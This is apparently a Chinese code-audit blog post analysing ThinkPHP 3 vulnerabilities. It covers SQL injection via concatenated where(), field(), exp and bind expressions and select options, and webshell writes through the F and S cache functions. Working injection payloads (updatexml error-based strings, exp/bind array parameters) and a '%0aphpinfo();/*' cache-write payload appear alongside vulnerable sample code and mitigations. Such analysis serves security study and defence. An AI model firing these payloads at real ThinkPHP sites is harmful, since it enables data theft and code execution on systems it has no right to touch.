---
title: "thinkphp3漏洞分析总结"
date: 2021-02-24 15:25:00
draft: false
tags: ['thinkphp']
categories: ['代码审计']
---


对thinkphp3漏洞进行总结
<!--more-->


## 前言

在说thinkphp3框架漏洞的时候，我们得首先区分一个概念，就是框架本身漏洞，和程序员写法问题而造成的漏洞。这两个是要区别开来的。框架本身的漏洞，我们只要碰到这种框架，就一定能利用成功，而程序员写代码是各不一样的。



## 程序员写法而造成的漏洞


### where函数使用字符串拼接导致的注入


thinkpphp3中的where函数，就是sql中的where条件。比如where($a),相当于sql中的
select * from user where a=xxx;


在使用where()的时候，如果使用字符串拼接的方式，就会导致注入。


#### 示例代码



```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $id=I('get.id'); //以get方式传参id，并用i方式进行过滤
        $user=M('user')->where('id='.$id)->select(); 条件是id等于用户传入的值
        var_dump($user);

    }
}
```




#### 分析


我们传入一个1x识程序报错，然后用phpstorm下断点进行调试。在第7行打入断点。f7进入


![image.png](https://sqlmap.wiki/images/image%20(10).png)


thinkphp中的m方法主要功能就是实例化，没啥看的，直接f8跳过。
进入到where函数
![image.png](https://sqlmap.wiki/images/image%20(11).png)




进入到select函数


![image.png](https://sqlmap.wiki/images/image%20(12).png)


![image.png](https://sqlmap.wiki/images/image%20(13).png)


![image.png](https://sqlmap.wiki/images/image%20(14).png)


![image.png](https://sqlmap.wiki/images/image%20(15).png)


可以看到，where函数使用字符串进行拼接的时候，底层是直接拼接的，没有使用任何过滤，所以我们只需要构造payload
```sql
1) and updatexml(1,concat(0x7e,user(),1),1)--+
```
![image.png](https://sqlmap.wiki/images/image%20(16).png)


#### 以数组传参不会导致注入


官方手册上，是推荐以数组传参的，这样是不会导致注入的。


#### 示例代码


```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function sql()
    {
        $id['id']=I('get.id');
        $user=M('user')->where($id)->select();
        var_dump($user);

    }
}
```




#### 分析


还是在user那打下断点，进入到_parseOptions，关键点。
![image.png](https://sqlmap.wiki/images/image%20(17).png)


![image.png](https://sqlmap.wiki/images/image%20(18).png)




所以总结，如果以数组进行传参，会进入到_parsetype方法进行数据类型强转，也就不存在注入了。


### field函数变量可控导致的注入



#### field()


field函数的功能是操作或返回字段。例如field('name'),转换成sql语句就是select name from xxx




这个其实没啥好说的，因为field底层语句就是直接进行拼接的。所以只要变量可控，不管是以字符串还是数组传参，都会导致注入


#### 示例代码


```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
   public function fiesql()
    {
        $id=I('get.id');
        $user=M('user')->field($id)->select();
        var_dump($user);
    }
}
```




#### payload


```php
id from user where 1=updatexml(1,concat(0x7e,user()),1)#


#### 总结
不止filed()，order,having,comment,group可控，就可注入


### 参数传递注入


前面我们说过，不管是直接使用原生的get或posr，还是i函数，都可能因为写法或者thinkphp本身的漏洞而造成注入，而参数传递也是我们要关注的。



#### 示例代码


```php
<?php
public function csct($name)
    {
       $data=M('user')->where('id='.$name)->select();
       var_dump($data);
    }
```


![image.png](https://sqlmap.wiki/images/image%20(19).png)


没啥好说的,因为这种传参本身就是走的原始请求



### exp表达式注入

#### 表达式


![image.png](https://sqlmap.wiki/images/image%20(20).png)
![image.png](https://sqlmap.wiki/images/image%20(21).png)




#### 分析
在前面说过，where函数推荐使用数组传递，能避免注入。但是如果开发者使用原生的GET或者POST传参，就会可能存在注入

示例代码


```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){

        $name[id]=$_GET['id'];
        $a=M('user')->where($name)->select();
        var_dump($a);
    }
}
```


#### 漏洞触发点


![image.png](https://sqlmap.wiki/images/image%20(22).png)


ThinkPHP/Library/Think/Db/Driver.class.php 第569到第470行，如果传的值等于exp，就会把where条件直接进行拼接。造成注入


想要进入到这个流程，我们直接往回溯源，ThinkPHP/Library/Think/Db/Driver.class.php 第549-550行，如果传入的是一个数组，往下继续执行，如果用户传的$val[0]是一个字符串，就能执行到漏洞触发点了




![image.png](https://sqlmap.wiki/images/image%20(23).png)




最后我们可以执行payload


```sql
id[0]=exp&exp[1]==updatexml(1,concat(0x7e,user(),0x7e),1)
```




![image.png](https://sqlmap.wiki/images/image%20(24).png)




#### 使用l函数避免注入


为什么使用I函数能避免注入呢




示例代码


```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){

        $name[id]=I('get.id');
        $a=M('user')->where($name)->select();
        var_dump($a);
    }
}
```


在name处打入断点进行分析，可以发现：
I函数默认通过htmlspecialchars()进行过滤，而且会通过ThinkPHP/Common/functions.php的think_filter()进行关键字过滤，因为think_filter过滤了exp关键字，所以我们这里不能通过exp进行注入了

![image.png](https://sqlmap.wiki/images/image%20(25).png)



### F，S缓存方法Getshell

thinkphp3用来缓存的方法有2个，分别是F，和S。
 如果设置了一个参数，就是读模板，两个参数就是写文件。三个参数就是写文件并有时间限制




#### F方法getshell




##### 示例代码


```php
<?php  
public function  ff()
    {
    	$a=$_GET['id'];
    	F('zzz',$a);
    }
?>
```
第一个参数是要写入的缓存文件名，第二个是要写入的内容。写入之后，会保存在/Application/Data/目录下


![image.png](https://sqlmap.wiki/images/image%20(26).png)


![image.png](https://sqlmap.wiki/images/image%20(27).png)






#### S方法Getshell


##### 示例代码


```php
    public function ss()
    {
    	$a=I('get.id');
    	S('xxx',$a);
    }

```


因为S方法写的文件内容是写在一行，所以我们要利用%0a等换行符进行绕过，后面也有特殊的字符，利用注释符注释


#### Payload


```
%0aphpinfo();/*
```


s方法生成的文件名是通过md5加密的。所以实际渗透中记得加密。生成的文件路径是/Application/Runtime/temp/xxx.php








#### 防范


只要文件内容可控，就能getshell，在没必要的时候，不要设置变量。如果有需求的话，tp有个文件缓存的安全机制，可以设置DATA_CACHE_KEY参数，避免缓存文件名被猜测到，例如：
```
'DATA_CACHE_KEY'=>'think'
```


其实就是给md5加了个盐，可以把这个key设置的复杂点


## thinkphp本身框架漏洞

### find/select/delete注入


前面说过，where函数，不使用数组或者预处理传参，就会导致注入，这样的是写法问题，与框架无关，主要是程序员的错误。这篇讲的就是thinkphp框架本身的错误，导致的漏洞。




#### 分析


##### 示例代码
```php
    public function sql(){
        $name=I('get.id');
        $a=M('user')->select($name);
        var_dump($a);
    }
```


前面说过，一般用where()来当限制条件，其实select，find，delete本身也是可以用来传参当限制条件的。


浏览器输入参数1x，phpstrom在$a开启调试。
经过seelct方法，会直接进入   _parseOptions()。在前面where参数可控的文章中说过，如果变量为字符串，会直接进行拼接，只有为数组才会进入到_parseOptions方法中。而这里会直接进入到 _parseOptions()。进入到_parseOptions之后，会进入到_parseType()，进行强转

![image.png](https://sqlmap.wiki/images/image%20(28).png)


这样，自然就不会存在注入了。
如果我们要让它不进入到_parseType,就得绕过这个if判断




ThinkPHP/Library/Think/Model.class.php 648
![image.png](https://sqlmap.wiki/images/image%20(29).png)


第二个条件中，where中的值为数组。我们可以直接传入payload


```php
id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)#
```
这样值的类型为字符串，进行了绕过
![image.png](https://sqlmap.wiki/images/image%20(30).png)
#### 总结


刚才演示的是select，find，delete都有这样的问题，这里就不再演示了


### update/insert 注入



原理没啥好说的，跟前面exp一样,都是直接拼接导致了注入。




#### 分析


```php
<?php
public function bindsql()
    {
        $name['id']=I('id');
        $pass['pass']=I('pass');
        $data=M('user')->where($name)->save($pass);
        var_dump($data);
    }
?>
```




#### 关键代码


ThinkPHP/Library/Think/Db/Driver.class.php 567-568


```bash
elseif('bind' == $exp ){ // 使用表达式
                    $whereStr .= $key.' = :'.$val[1];
```




可以看到，虽然是通过直接拼接的。但是在关键字key后面是加了一个冒号的，如果还按照exp那篇文章的payload打，会出现这个问题
![image.png](https://sqlmap.wiki/images/image%20(31).png)

值前面有个冒号，而pass那个值直接为空，并没有出现冒号，这是为什么呢。我们继续往下调试。




ThinkPHP/Library/Think/Db/Driver.class.php ，906行 执行excute方法，跟进excute方法


```bash
return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
```


ThinkPHP/Library/Think/Db/Driver.class.php  143-145行

```php
 if(!empty($this->bind)){
            $that   =   $this;
             $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
        }
```


我们来分析下这段代码。strtr函数主要功能是替换字符。这里有2个参数，第一个参数就是要被替换的字符串。第二个是一个数组。如果第二个参数的键存在在第一个参数里，就把它替换成它数组的值。


##### strtr例子
```php
<?php
$name=array('id' => 'dejavu');
$zf="hello my name is id";
echo strtr($zf,$name);

#输出
hello my name is dejavu
```


array_map函数也差不多，只不过替换的是数组的值。


##### array_map例子


```php
  <?php
    $name=array('id' => 'zzz');
    var_dump(array_map(function($val){return 'dejavu';},$name));


##### 输出
array (size=1)
  'id' => string 'dejavu' (length=6)
```
可以看到，这里是替换数组的值。


再回到最开始那个语句。


```php
 if(!empty($this->bind)){
            $that   =   $this;
             $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '\''.$that->escapeString($val).'\''; },$this->bind));
        }
```
经过调试，我们知道 queryStr就是原始拼接完整的sql语句，bind是一个数组，键是: 值是空。
到这里应该都懂了，这段代码的功能就是把queryStr中的:转成空。因为bind是我们可控的，所以我们可以传一个bind['1']=0,代码经过ThinkPHP/Library/Think/Db/Driver.class.php 568行，自动在前面0前面加上个冒号，然后经过145行，替换为空。最后造成注入

#### Payload


```sql
id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)
```




#### 总结


前面那篇exp的文章，如果使用了I函数，将不会引发注入，因为think_filter方法会在关键字后面加上空格。而update/insert
注入不存在这样的问题，因为关键字中并没有bind关键字，所以使用了I函数，我们还是能继续注入。thinkphp3.2.4的修复就是增加了bind关键字的过滤
